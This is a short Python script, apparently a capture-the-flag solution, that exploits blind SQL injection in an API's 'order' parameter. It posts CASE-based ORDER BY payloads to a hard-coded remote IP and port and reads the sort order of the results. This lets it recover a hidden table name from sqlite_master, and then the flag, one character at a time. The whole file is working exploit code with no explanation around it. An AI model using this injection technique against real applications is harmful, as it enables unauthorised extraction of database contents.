import string

import requests

if __name__ == "__main__":
    #URL = "http://localhost:1337/api/list"
    URL = "http://138.68.148.149:31207/api/list"
    HEADERS = {"Content-Type": "application/json"}
    
    CHRS = "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!\"#$&'()*+,-./:;<=>?@[\\]^`{|~"

    flag_table = "flag_"

    # use case statement with sort order to reveal flag table name character by character
    while len(flag_table) < 15:
        for c in string.hexdigits.lower():
            order = f"(case when (select 1 from sqlite_master where tbl_name like '{flag_table + c}%') then id else count end) asc"
            res = requests.post(URL, headers=HEADERS, json={"order": order})

            # sorted by id so table name was found
            if res.json()[0]["id"] == 1:
                flag_table += c
                print(flag_table)
                break

    print("flag table:", flag_table)
    flag = "CHTB{"

    # do the same thing for the actual flag stored in flag table
    while flag[-1] != "}":
        for c in CHRS:
            order = f"(case when (select 1 from {flag_table} where flag like '{flag + c}%') then id else count end) asc"
            res = requests.post(URL, headers=HEADERS, json={"order": order})

            # sorted by id so table name was found
            if res.json()[0]["id"] == 1:
                flag += c
                print(flag)
                break

    print("flag:", flag)
